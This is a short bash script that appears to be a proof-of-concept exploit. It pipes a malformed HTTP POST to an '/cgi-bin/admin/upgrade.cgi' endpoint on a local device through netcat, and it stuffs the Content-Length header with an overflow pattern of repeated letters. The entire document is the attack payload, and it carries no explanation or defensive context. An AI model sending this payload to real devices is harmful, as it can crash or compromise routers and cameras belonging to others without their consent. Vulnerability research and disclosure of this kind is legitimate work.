#!/bin/bash

echo -en "POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | nc -v 192.168.2.2 80
